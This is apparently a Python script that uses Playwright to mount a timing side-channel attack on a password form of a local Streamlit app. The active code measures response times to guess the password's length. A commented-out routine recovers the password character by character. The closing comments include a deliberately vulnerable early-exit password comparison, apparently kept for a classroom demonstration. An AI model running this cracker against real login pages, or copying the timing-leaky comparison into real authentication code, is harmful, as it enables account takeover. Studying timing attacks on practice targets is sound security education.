from playwright.sync_api import Page, expect, sync_playwright

import re
import itertools
import random
import string
import timeit
import numpy as np

allowed_chars = string.ascii_lowercase + " "

def random_str(size):
    return ''.join(random.choices(allowed_chars, k=size))

def crack_length(page, max_len=32, verbose=False) -> int:
    trials = 10
    times = np.empty(max_len)
    myglobals = dict(globals())
    myglobals['page'] = page
    print(myglobals)

    for i in range(1, max_len+1):
        i_time = timeit.repeat(stmt='check_password(x, page)',
                               setup=f'x=random_str({i!r})',
                               globals=myglobals,
                               number=trials,
                               repeat=2)
        times[i-1] = min(i_time)

    if verbose:
        most_likely_n = np.argsort(times)[::-1][:5]
        print(most_likely_n, times[most_likely_n] / times[most_likely_n[0]])

    most_likely = int(np.argmax(times))
    return most_likely


# def crack_password(page, length, verbose=False):
#     guess = random_str(length)
#     counter = itertools.count()
#     trials = 1000
#     while True:
#         i = next(counter) % length
#         for c in allowed_chars:
#             alt = guess[:i] + c + guess[i + 1:]

#             alt_time = timeit.repeat(stmt='check_password(page, x)',
#                                      setup=f'x={alt!r}',
#                                      globals=globals(),
#                                      number=trials,
#                                      repeat=10)

#             guess_time = timeit.repeat(stmt='check_password(page, x)',
#                                        setup=f'x={guess!r}',
#                                        globals=globals(),
#                                        number=trials,
#                                        repeat=10)

#             if check_password(page, alt):
#                 return alt

#             if min(alt_time) > min(guess_time):
#                 guess = alt
#                 if verbose:
#                     print(guess)

def check_password(password, page: Page):
    print(len(password))
    CSS_SELECTOR = "input[aria-label=Password]"
    page.goto("http://localhost:8501/")           
    page.fill(CSS_SELECTOR, password)
    page.locator(CSS_SELECTOR).press('Enter')
    message = page.inner_text("div.stAlert")
    return message == "Success!"

def main():
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        
        # print(check_password("hard", page))
        # print(check_password("hardpassword69", page))

        length = crack_length(page,verbose=True)
    
        # print(f"using most likely length {length}")
        
        # input("hit enter to continue...")
    
        # password = crack_password(page, length, verbose=True)
        # print(f"password cracked:'{password}'")


if __name__ == '__main__':
    main()

# # Unless you have a very stable computer,
# # you will only be able to crack the length of the password
# # if you use this check_password
# # def check_password(user, guess):
# #     actual = password_database[user]
# #     return actual == guess


# # Using this check_password, you should be able
# # to crack the full password.
# def check_password(user, guess):
#     actual = password_database[user]
#     if len(guess) != len(actual):
#         return False

#     for i in range(len(actual)):
#         if guess[i] != actual[i]:
#             return False
#     return True




